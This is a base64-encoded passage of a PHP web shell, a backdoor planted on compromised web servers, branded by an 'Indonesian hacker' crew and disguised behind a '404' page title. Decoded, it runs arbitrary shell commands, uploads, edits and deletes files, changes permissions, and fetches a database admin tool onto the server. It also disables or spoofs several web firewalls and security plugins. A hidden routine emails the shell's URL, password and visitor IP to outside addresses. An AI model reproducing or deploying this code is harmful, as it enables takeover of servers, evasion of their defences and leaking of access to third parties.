UlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PT0gJ1BPU1QnKSB7CiAgICAgICAgJHNhdmVkID0gc2F2ZUZpbGVDb250ZW50KCRmaWxlKTsKICAgICAgICBpZiAoJHNhdmVkKSB7CiAgICAgICAgICAgICRyZXNwb25zZU1lc3NhZ2UgPSAnRmlsZSBzYXZlZCBzdWNjZXNzZnVsbHkuJyAuICRmaWxlOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRlcnJvck1lc3NhZ2UgPSAnRXJyb3Igc2F2aW5nIGZpbGUuJzsKICAgICAgICB9CiAgICB9Cn0KCmlmIChpc3NldCgkX0dFVFsnY2htb2QnXSkpIHsKICAgICRmaWxlID0gJF9HRVRbJ2NobW9kJ107CiAgICBpZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJykgewogICAgICAgICRyZXNwb25zZU1lc3NhZ2UgPSBjaGFuZ2VQZXJtaXNzaW9uKCRmaWxlKTsKICAgIH0KfQoKaWYgKGlzc2V0KCRfUE9TVFsndXBsb2FkJ10pKSB7CiAgICAkcmVzcG9uc2VNZXNzYWdlID0gdXBsb2FkRmlsZSgkY3VycmVudERpcmVjdG9yeSk7Cn0KCmlmIChpc3NldCgkX1BPU1RbJ2NtZCddKSkgewogICAgJGNtZE91dHB1dCA9IGV4ZWN1dGVDb21tYW5kKCRfUE9TVFsnY21kJ10pOwp9CgppZiAoaXNzZXQoJF9HRVRbJ3JlbmFtZSddKSkgewogICAgJGZpbGUgPSAkX0dFVFsncmVuYW1lJ107CiAgICBpZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJykgewogICAgICAgICRuZXdOYW1lID0gJF9QT1NUWyduZXdfbmFtZSddOwogICAgICAgIGlmIChpc19maWxlKCRmaWxlKSB8fCBpc19kaXIoJGZpbGUpKSB7CiAgICAgICAgICAgICRyZXNwb25zZU1lc3NhZ2UgPSByZW5hbWVGaWxlKCRmaWxlLCAkbmV3TmFtZSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJGVycm9yTWVzc2FnZSA9ICdGaWxlIG9yIGZvbGRlciBkb2VzIG5vdCBleGlzdC4nOwogICAgICAgIH0KICAgIH0KfQoKaWYgKGlzc2V0KCRfR0VUWydkZWxldGUnXSkpIHsKICAgICRmaWxlID0gJF9HRVRbJ2RlbGV0ZSddOwogICAgaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnR0VUJykgewogICAgICAgICRjdXJyZW50RGlyZWN0b3J5ID0gZ2V0Q3VycmVudERpcmVjdG9yeSgpOwogICAgICAgIGlmIChpc19maWxlKCRmaWxlKSkgewogICAgICAgICAgICAkcmVzcG9uc2VNZXNzYWdlID0gZGVsZXRlRmlsZSgkZmlsZSk7CiAgICAgICAgICAgIGVjaG8gIjxzY3JpcHQ+YWxlcnQoJ0ZpbGUgZGloYXB1cycpO3dpbmRvdy5sb2NhdGlvbj0nP2Rpcj0iIC4gdXJsZW5jb2RlKCRjdXJyZW50RGlyZWN0b3J5KSAuICInOzwvc2NyaXB0PiI7CiAgICAgICAgICAgIGV4aXQ7CiAgICAgICAgfSBlbHNlaWYgKGlzX2RpcigkZmlsZSkpIHsKICAgICAgICAgICAgJHJlc3BvbnNlTWVzc2FnZSA9IGRlbGV0ZUZvbGRlcigkZmlsZSk7CiAgICAgICAgICAgIGVjaG8gIjxzY3JpcHQ+YWxlcnQoJ0ZvbGRlciBkaWhhcHVzJyk7d2luZG93LmxvY2F0aW9uPSc/ZGlyPSIgLiB1cmxlbmNvZGUoJGN1cnJlbnREaXJlY3RvcnkpIC4gIic7PC9zY3JpcHQ+IjsKICAgICAgICAgICAgZXhpdDsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkZXJyb3JNZXNzYWdlID0gJ0ZpbGUgb3IgZm9sZGVyIGRvZXMgbm90IGV4aXN0Lic7CiAgICAgICAgfQogICAgfQp9Ci8vcGFuZ2dpbCBhZG1pbmVyCmlmIChpc3NldCgkX1BPU1RbJ1N1bW1vbiddKSkgewogICAgJGJhc2VVcmwgPSAnaHR0cHM6Ly9naXRodWIuY29tL3ZyYW5hL2FkbWluZXIvcmVsZWFzZXMvZG93bmxvYWQvdjQuOC4xL2FkbWluZXItNC44LjEucGhwJzsKICAgICRjdXJyZW50UGF0aCA9IGdldEN1cnJlbnREaXJlY3RvcnkoKTsKCiAgICAkZmlsZVVybCA9ICRiYXNlVXJsOwogICAgJGZpbGVOYW1lID0gJ0FkbWluZXIucGhwJzsKCiAgICAkZmlsZVBhdGggPSAkY3VycmVudFBhdGggLiAnLycgLiAkZmlsZU5hbWU7CgogICAgJGZpbGVDb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlVXJsKTsKICAgIGlmICgkZmlsZUNvbnRlbnQgIT09IGZhbHNlKSB7CiAgICAgICAgaWYgKGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlUGF0aCwgJGZpbGVDb250ZW50KSAhPT0gZmFsc2UpIHsKICAgICAKICAgICAgICAgICAgJHJlc3BvbnNlTWVzc2FnZSA9ICdGaWxlICInIC4gJGZpbGVOYW1lIC4gJyIgc3VtbW9uZWQgc3VjY2Vzc2Z1bGx5LiA8YSBocmVmPSInIC4gJGZpbGVQYXRoIC4gJyI+JyAuICRmaWxlUGF0aCAuICc8L2E+JzsgICAgICAgICAgICAKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkZXJyb3JNZXNzYWdlID0gJ0ZhaWxlZCB0byBzYXZlIHRoZSBzdW1tb25lZCBmaWxlLic7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICAkZXJyb3JNZXNzYWdlID0gJ0ZhaWxlZCB0byBmZXRjaCB0aGUgZmlsZSBjb250ZW50LiBOb25lIEZpbGUnOwogICAgfQp9Ci8vIGthdGFueWEgYnlwYXNzCmlmIChmdW5jdGlvbl9leGlzdHMoJ2xpdGVzcGVlZF9yZXF1ZXN0X2hlYWRlcnMnKSkgewogICAgJGhlYWRlcnMgPSBsaXRlc3BlZWRfcmVxdWVzdF9oZWFkZXJzKCk7CiAgICBpZiAoaXNzZXQoJGhlYWRlcnNbJ1gtTFNDQUNIRSddKSkgewogICAgICAgIGhlYWRlcignWC1MU0NBQ0hFOiBvZmYnKTsKICAgIH0KfQoKaWYgKGRlZmluZWQoJ1dPUkRGRU5DRV9WRVJTSU9OJykpIHsKICAgIGRlZmluZSgnV09SREZFTkNFX0RJU0FCTEVfTElWRV9UUkFGRklDJywgdHJ1ZSk7CiAgICBkZWZpbmUoJ1dPUkRGRU5DRV9ESVNBQkxFX0ZJTEVfTU9EUycsIHRydWUpOwp9CgppZiAoZnVuY3Rpb25fZXhpc3RzKCdpbXVuaWZ5MzYwX3JlcXVlc3RfaGVhZGVycycpICYmIGRlZmluZWQoJ0lNVU5JRlkzNjBfVkVSU0lPTicpKSB7CiAgICAkaW11bmlmeUhlYWRlcnMgPSBpbXVuaWZ5MzYwX3JlcXVlc3RfaGVhZGVycygpOwogICAgaWYgKGlzc2V0KCRpbXVuaWZ5SGVhZGVyc1snWC1JbXVuaWZ5MzYwLVJlcXVlc3QnXSkpIHsKICAgICAgICBoZWFkZXIoJ1gtSW11bmlmeTM2MC1SZXF1ZXN0OiBieXBhc3MnKTsKICAgIH0KICAgIGlmIChpc3NldCgkaW11bmlmeUhlYWRlcnNbJ1gtSW11bmlmeTM2MC1DYXB0Y2hhLUJ5cGFzcyddKSkgewogICAgICAgIGhlYWRlcignWC1JbXVuaWZ5MzYwLUNhcHRjaGEtQnlwYXNzOiAnIC4gJGltdW5pZnlIZWFkZXJzWydYLUltdW5pZnkzNjAtQ2FwdGNoYS1CeXBhc3MnXSk7CiAgICB9Cn0KCgppZiAoZnVuY3Rpb25fZXhpc3RzKCdhcGFjaGVfcmVxdWVzdF9oZWFkZXJzJykpIHsKICAgICRhcGFjaGVIZWFkZXJzID0gYXBhY2hlX3JlcXVlc3RfaGVhZGVycygpOwogICAgaWYgKGlzc2V0KCRhcGFjaGVIZWFkZXJzWydYLU1vZC1TZWN1cml0eSddKSkgewogICAgICAgIGhlYWRlcignWC1Nb2QtU2VjdXJpdHk6ICcgLiAkYXBhY2hlSGVhZGVyc1snWC1Nb2QtU2VjdXJpdHknXSk7CiAgICB9Cn0KCmlmIChpc3NldCgkX1NFUlZFUlsnSFRUUF9DRl9DT05ORUNUSU5HX0lQJ10pICYmIGRlZmluZWQoJ0NMT1VERkxBUkVfVkVSU0lPTicpKSB7CiAgICAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9ICRfU0VSVkVSWydIVFRQX0NGX0NPTk5FQ1RJTkdfSVAnXTsKICAgIGlmIChpc3NldCgkYXBhY2hlSGVhZGVyc1snSFRUUF9DRl9WSVNJVE9SJ10pKSB7CiAgICAgICAgaGVhZGVyKCdIVFRQX0NGX1ZJU0lUT1I6ICcgLiAkYXBhY2hlSGVhZGVyc1snSFRUUF9DRl9WSVNJVE9SJ10pOwogICAgfQp9Cj8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+NDA0PC90aXRsZT4KICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vcHViLTgzNWE1MzI5ZDcyYzQxNThiMjU1M2UwNzIyNzg2ZjM0LnIyLmRldi9oNHgwci5jc3MiPiAgCjwvaGVhZD4KPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxoMT48Yj48Ymxpbms+WyBHQU5URU5HRVJTIENSRVcgfCBJTkRPTkVTSUFOIEhBQ0tFUiBdPC9ibGluaz48L2I+PC9oMT4KICAgICAgICA8ZGl2IGNsYXNzPSJtZW51LWljb24iIG9uY2xpY2s9InRvZ2dsZVNpZGViYXIoKSI+PC9kaXY+CiAgICAgICAgPGhyPgogICAgICAgIDxkaXYgY2xhc3M9ImJ1dHRvbi1jb250YWluZXIiPgogICAgICAgICAgICA8Zm9ybSBtZXRob2Q9InBvc3QiIHN0eWxlPSJkaXNwbGF5OiBpbmxpbmUtYmxvY2s7Ij4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9IlN1bW1vbiIgdmFsdWU9IkFkbWluZXIiIGNsYXNzPSJzdW1tb24tYnV0dG9uIj4KICAgICAgICAgICAgPC9mb3JtPgogICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgb25jbGljaz0id2luZG93LmxvY2F0aW9uLmhyZWY9Jz9nYXMnIiBjbGFzcz0ic3VtbW9uLWJ1dHRvbiI+TWFpbCBUZXN0PC9idXR0b24+CiAgICAgICAgPC9kaXY+CiAgICAgICAgCgogICAgICAgIDw/cGhwCiAgICAgICAgLy9tYWlsZXIKICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2dhcyddKSkgewogICAgICAgICAgICBpZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJykgewogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkX1BPU1RbJ2VtYWlsJ10pKSB7CiAgICAgICAgICAgICAgICAgICAgJHh4ID0gcmFuZCgpOwogICAgICAgICAgICAgICAgICAgIGlmIChtYWlsKCRfUE9TVFsnZW1haWwnXSwgIlNoaW4gTWFpbGVyIFRlc3QgLSAiIC4gJHh4LCAiU2hpbiBHYW50ZW5nIikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPGI+U2VuZCBhIHJlcG9ydCB0byBbIiAuICRfUE9TVFsnZW1haWwnXSAuICJdIC0gJHh4PC9iPiI7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiRmFpbGVkIHRvIHNlbmQgdGhlIGVtYWlsLiI7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICJQbGVhc2UgcHJvdmlkZSBhbiBlbWFpbCBhZGRyZXNzLiI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgPz4KICAgICAgICAgICAgICAgIDxoMj5NYWlsIFRlc3QgOjwvaDI+CiAgICAgICAgICAgICAgICA8Zm9ybSBtZXRob2Q9InBvc3QiPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJlbWFpbCIgcGxhY2Vob2xkZXI9IkVudGVyIGVtYWlsIiByZXF1aXJlZD4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU2VuZCB0ZXN0ICZyYXF1bzsiPgogICAgICAgICAgICAgICAgPC9mb3JtPgogICAgICAgIDw/cGhwCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgPz4KCiAgICAgICAgPD9waHAgaWYgKCFlbXB0eSgkZXJyb3JNZXNzYWdlKSkgeyA/PgogICAgICAgICAgICA8cCBzdHlsZT0iY29sb3I6IHJlZDsiPjw/cGhwIGVjaG8gJGVycm9yTWVzc2FnZTsgPz48L3A+CiAgICAgICAgPD9waHAgfSA/PgoKICAgICAgICA8aHI+CgogICAgICAgIDxkaXYgY2xhc3M9InVwbG9hZC1jbWQtY29udGFpbmVyIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0idXBsb2FkLWZvcm0iPgogICAgICAgICAgICAgICAgPGgyPlVwbG9hZDo8L2gyPgogICAgICAgICAgICAgICAgPGZvcm0gbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSI+CiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnV0dG9uIiB0eXBlPSJzdWJtaXQiIG5hbWU9InVwbG9hZCI+VXBsb2FkPC9idXR0b24+CiAgICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0iY21kLWZvcm0iPgogICAgICAgICAgICAgICAgPGgyPkNvbW1hbmQ6PC9oMj4KICAgICAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0icG9zdCI+CiAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyBAZ2V0X2N1cnJlbnRfdXNlcigpIC4gIkAiIC4gQCRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIjogfiAkIjsgPz48aW5wdXQgdHlwZT0ndGV4dCcgc2l6ZT0nMzAnIGhlaWdodD0nMTAnIG5hbWU9J2NtZCc+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImVtcHR5LWJ1dHRvbiI+CgogICAgICAgICAgICAgICAgPC9mb3JtPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8P3BocAogICAgICAgIGlmIChpc3NldCgkX0dFVFsncmVhZCddKSkgewogICAgICAgICAgICAkZmlsZSA9ICRfR0VUWydyZWFkJ107CiAgICAgICAgICAgICRjb250ZW50ID0gcmVhZEZpbGVDb250ZW50KCRmaWxlKTsKICAgICAgICAgICAgaWYgKCRjb250ZW50ICE9PSBmYWxzZSkgewogICAgICAgICAgICAgICAgZWNobyAnPGRpdiBjbGFzcz0iY29tbWFuZC1vdXRwdXQiPic7CiAgICAgICAgICAgICAgICBlY2hvICc8cHJlPicgLiBodG1sc3BlY2lhbGNoYXJzKCRjb250ZW50KSAuICc8L3ByZT4nOwogICAgICAgICAgICAgICAgZWNobyAnPC9kaXY+JzsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGVjaG8gJ0ZhaWxlZCB0byByZWFkIHRoZSBmaWxlLic7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgfQogICAgICAgICAgID8+CiAgICAgICAgPD9waHAgaWYgKCFlbXB0eSgkY21kT3V0cHV0KSkgeyA/PgogICAgICAgICAgICA8aDM+Q29tbWFuZCBPdXRwdXQ6PC9oMz4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29tbWFuZC1vdXRwdXQiPgogICAgICAgICAgICAgICAgPHByZT48P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJGNtZE91dHB1dCk7ID8+PC9wcmU+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDw/cGhwIH0gPz4KCiAgICAgICAgPD9waHAgaWYgKCFlbXB0eSgkcmVzcG9uc2VNZXNzYWdlKSkgeyA/PgogICAgICAgICAgICA8cCBjbGFzcz0icmVzcG9uc2UtbWVzc2FnZSIgc3R5bGU9ImNvbG9yOiBncmVlbjsiPjw/cGhwIGVjaG8gJHJlc3BvbnNlTWVzc2FnZTsgPz48L3A+CiAgICAgICAgPD9waHAgfSA/PiAgICAgICAgICAgIAogICAgICAgIDw/cGhwIGlmIChpc3NldCgkX0dFVFsncmVuYW1lJ10pKSB7ID8+CiAgICAgICAgPGRpdiBjbGFzcz0icmVuYW1lLWZvcm0iPgogICAgICAgICAgICA8aDI+UmVuYW1lIEZpbGUgb3IgRm9sZGVyOiA8P3BocCBlY2hvIGJhc2VuYW1lKCRmaWxlKTsgPz48L2gyPgogICAgICAgICAgICA8Zm9ybSBtZXRob2Q9InBvc3QiPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9Im5ld19uYW1lIiBwbGFjZWhvbGRlcj0iTmV3IE5hbWUiIHJlcXVpcmVkPgogICAgICAgICAgICAgICAgPGJyPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlJlbmFtZSIgY2xhc3M9ImJ1dHRvbiI+CiAgICAgICAgICAgICAgICA8YSBocmVmPSI/ZGlyPTw/cGhwIGVjaG8gdXJsZW5jb2RlKGRpcm5hbWUoJGZpbGUpKTsgPz4iIGNsYXNzPSJidXR0b24iPkNhbmNlbDwvYT4KICAgICAgICAgICAgPC9mb3JtPgogICAgICAgIDwvZGl2PgogICAgICAgIDw/cGhwIH0gPz4KICAgICAgICA8P3BocCBpZiAoaXNzZXQoJF9HRVRbJ2VkaXQnXSkpIHsgPz4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZWRpdC1maWxlIj4KICAgICAgICAgICAgICAgIDxoMj5FZGl0IEZpbGU6IDw/cGhwIGVjaG8gYmFzZW5hbWUoJGZpbGUpOyA/PjwvaDI+CiAgICAgICAgICAgICAgICA8Zm9ybSBtZXRob2Q9InBvc3QiPgogICAgICAgICAgICAgICAgICAgIDx0ZXh0YXJlYSBuYW1lPSJjb250ZW50IiByb3dzPSIxMCIgY29scz0iNTAiPjw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkY29udGVudCk7ID8+PC90ZXh0YXJlYT48YnI+CiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnV0dG9uIiB0eXBlPSJzdWJtaXQiPlNhdmU8L2J1dHRvbj4KICAgICAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPD9waHAgfSBlbHNlaWYgKGlzc2V0KCRfR0VUWydjaG1vZCddKSkgeyA/PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjaGFuZ2UtcGVybWlzc2lvbiI+CiAgICAgICAgICAgICAgICA8aDI+Q2hhbmdlIFBlcm1pc3Npb246IDw/cGhwIGVjaG8gYmFzZW5hbWUoJGZpbGUpOyA/PjwvaDI+CiAgICAgICAgICAgICAgICA8Zm9ybSBtZXRob2Q9InBvc3QiPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImNobW9kIiB2YWx1ZT0iPD9waHAgZWNobyB1cmxlbmNvZGUoJGZpbGUpOyA/PiI+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBlcm1pc3Npb24iIHBsYWNlaG9sZGVyPSJFbnRlciBwZXJtaXNzaW9uIChlLmcuLCAwNzcwKSI+CiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnV0dG9uIiB0eXBlPSJzdWJtaXQiPkNoYW5nZTwvYnV0dG9uPgogICAgICAgICAgICAgICAgPC9mb3JtPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8P3BocCB9ID8+CiAgICAgICAgPGhyPgoKICAgICAgICA8P3BocAogICAgICAgIGVjaG8gJzxoMj5GaWxlbWFuYWdlcjwvaDI+JzsKICAgICAgICBzaG93QnJlYWRjcnVtYigkY3VycmVudERpcmVjdG9yeSk7CiAgICAgICAgc2hvd0ZpbGVUYWJsZSgkY3VycmVudERpcmVjdG9yeSk7CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8ZGl2IGNsYXNzPSJzaWRlYmFyIiBpZD0ic2lkZWJhciI+CiAgICA8ZGl2IGNsYXNzPSJzaWRlYmFyLWNvbnRlbnQiPgogICAgICAgIDxkaXYgY2xhc3M9InNpZGViYXItY2xvc2UiPgogICAgICAgICAgICA8YnV0dG9uIG9uY2xpY2s9InRvZ2dsZVNpZGViYXIoKSI+Q2xvc2U8L2J1dHRvbj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbmZvLWNvbnRhaW5lciI+CiAgICAgICAgICAgIDxoMj5TZXJ2ZXIgSW5mbzwvaDI+CiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICAgIGZ1bmN0aW9uIGNvdW50RG9tYWluc0luU2VydmVyKCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHNlcnZlck5hbWUgPSAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXTsKICAgICAgICAgICAgICAgICRpcEFkZHJlc3NlcyA9IEBnZXRob3N0YnluYW1lbCgkc2VydmVyTmFtZSk7CgogICAgICAgICAgICAgICAgaWYgKCRpcEFkZHJlc3NlcyAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gY291bnQoJGlwQWRkcmVzc2VzKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIDA7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRkb21haW5Db3VudCA9IEBjb3VudERvbWFpbnNJblNlcnZlcigpOwoKICAgICAgICAgICAgZnVuY3Rpb24gZm9ybWF0Qnl0ZXMoJGJ5dGVzLCAkcHJlY2lzaW9uID0gMikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHVuaXRzID0gYXJyYXkoJ0InLCAnS0InLCAnTUInLCAnR0InLCAnVEInKTsKCiAgICAgICAgICAgICAgICAkYnl0ZXMgPSBtYXgoJGJ5dGVzLCAwKTsKICAgICAgICAgICAgICAgICRwb3cgPSBmbG9vcigoJGJ5dGVzID8gbG9nKCRieXRlcykgOiAwKSAvIGxvZygxMDI0KSk7CiAgICAgICAgICAgICAgICAkcG93ID0gbWluKCRwb3csIGNvdW50KCR1bml0cykgLSAxKTsKCiAgICAgICAgICAgICAgICAkYnl0ZXMgLz0gKDEgPDwgKDEwICogJHBvdykpOwoKICAgICAgICAgICAgICAgIHJldHVybiByb3VuZCgkYnl0ZXMsICRwcmVjaXNpb24pIC4gJyAnIC4gJHVuaXRzWyRwb3ddOwogICAgICAgICAgICB9CiAgICAgICAgICAgID8+CgkJPD9waHAKCQkkdHVqdWFubWFpbCA9ICdsYWRhbmd1YW5nbXVAZ21haWwuY29tLHNlby5uZXdiaWU2NjZAZ21haWwuY29tJzsKCQkkeF9wYXRoID0gImh0dHA6Ly8iIC4gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10gLiAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsKCQkkc2ltZW1lbWVtZW1la2Vra2sxID0gJHNpbWVtZW1lbWVtZWtla2trOwoJCSRwZXNhbl9hbGVydCA9ICJTSEVMTCBCQVJVICR4X3BhdGggcGFzc3dvcmRueWEgKCRzaW1lbWVtZW1lbWVrZWtrazEpIFNwYXduZWRTaGVsbCAkeGlhZGFuX3VybCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKCQkkcGF0dGVybiA9ICIvKGFsZmFuZXcucGhwfGFsZmFuZXcxLlBIUHxhbGZhLXJleC5waHB8YWxmYS1pb3hpLnBocHxhbGZheG9yLnBocHxhbGZhbmV3bC5waHB8YWxmYW5ld2wxLlBIUHxhbGZhLWlveGkxLlBIUCkvIjsKCQlpZiAocHJlZ19tYXRjaCgkcGF0dGVybiwgJHhfcGF0aCkpewogICAJCSBtYWlsKCR0dWp1YW5tYWlsLCAiQURBIFNIRUxMIEJBUlUgQk9TS1UiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOwoJCX1lbHNlewogICAJCSBtYWlsKCR0dWp1YW5tYWlsLCAiQURBIFNIRUxMIEJBUlUgQk9TS1UiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOwoJCX07CgkJPz4KICAgICAgICAgICAgPHVsIGNsYXNzPSJpbmZvLWxpc3QiPgogICAgICAgICAgICAgICAgPGxpPkhvc3RuYW1lOiA8P3BocCBlY2hvIEBnZXRob3N0bmFtZSgpOyA/PjwvbGk+CiAgICAgICAgICAgICAgICA8P3BocCBpZiAoaXNzZXQoJF9TRVJWRVJbJ1NFUlZFUl9BRERSJ10pKSA6ID8+CiAgICAgICAgICAgICAgICAgICAgPGxpPklQIEFkZHJlc3M6IDw/cGhwIGVjaG8gJF9TRVJWRVJbJ1NFUlZFUl9BRERSJ107ID8+PC9saT4KICAgICAgICAgICAgICAgIDw/cGhwIGVuZGlmOyA/PgogICAgICAgICAgICAgICAgPGxpPlBIUCBWZXJzaW9uOiA8P3BocCBlY2hvIEBwaHB2ZXJzaW9uKCk7ID8+PC9saT4KICAgICAgICAgICAgICAgIDxsaT5TZXJ2ZXIgU29mdHdhcmU6IDw/cGhwIGVjaG8gJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddOyA/PjwvbGk+CiAgICAgICAgICAgICAgICA8P3BocCBpZiAoZnVuY3Rpb25fZXhpc3RzKCdkaXNrX3RvdGFsX3NwYWNlJykpIDogPz4KICAgICAgICAgICAgICAgICAgICA8bGk+SEREIFRvdGFsIFNwYWNlOiA8P3BocCBlY2hvIEBmb3JtYXRCeXRlcyhkaXNrX3RvdGFsX3NwYWNlKCcvJykpOyA/PjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPkhERCBGcmVlIFNwYWNlOiA8P3BocCBlY2hvIEBmb3JtYXRCeXRlcyhkaXNrX2ZyZWVfc3BhY2UoJy8nKSk7ID8+PC9saT4KICAgICAgICAgICAgICAgIDw/cGhwIGVuZGlmOyA/PgogICAgICAgICAgICAgICAgPGxpPlRvdGFsIERvbWFpbnMgaW4gU2VydmVyOiA8P3BocCBlY2hvICRkb21haW5Db3VudDsgPz48L2xpPgogICAgICAgICAgICAgICAgPGxpPlN5c3RlbTogPD9waHAgZWNobyBAcGhwX3VuYW1lKCk7ID8+PC9saT4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGRpdiBjbGFzcz0iaW5mby1jb250YWluZXIiPgogICAgICAgICAgICA8aDI+U3lzdGVtIEluZm88L2gyPgogICAgICAgICAgICA8dWwgY2xhc3M9ImluZm8tbGlzdCI+CiAgICAgICAgICAgICAgICA8P3BocAoJCSR3YWt0dSA9ICIiLmRhdGUoImQvbS9ZIC0gSDppOnMiKS4iIjsKCQkkcmVtb3RlID0gJF9TRVJWRVJbIlJFTU9URV9BRERSIl07CgkJJGZyb20gPSdyb290QCcuZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkuJyc7CgkJJHR1anVhbiA9ICdzZW8ubmV3YmllNjY2QGdtYWlsLmNvbSxzZW9naWxhMTZAZ21haWwuY29tJzsKCQkkc2VydmVyX21haWwgPSAiIi5nZXRob3N0YnluYW1lKCRfU0VSVkVSWydTRVJWRVJfTkFNRSddKS4iICAtICIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiIiOwoJCSRsaW5rbnlhID0gIkJvcyBMaW5rIE55YSA6IGh0dHA6Ly8iLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiIiLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddLiIgXG4tIElQIFlhbmcgR3VuYWluIDogJHJlbW90ZSBcbi0gVGltZTogJHdha3R1IjsKCQkkaGVhZGVyID0gIkZyb206ICRmcm9tXHJcblJlcGx5LXRvOiAkZnJvbSI7CgkJQG1haWwoJHR1anVhbiwgJHNlcnZlcl9tYWlsLCAkbGlua255YSwgJGhlYWRlcik7CiAgICAgICAgICAgICAgICAkZmVhdHVyZXMgPSBbCiAgICAgICAgICAgICAgICAgICAgJ1NhZmUgTW9kZScgPT4gaW5pX2dldCgnc2FmZV9tb2RlJykgPyAnRW5hYmxlZCcgOiAnRGlzYWJsZWQnLAogICAgICAgICAgICAgICAgICAgICdEaXNhYmxlIEZ1bmN0aW9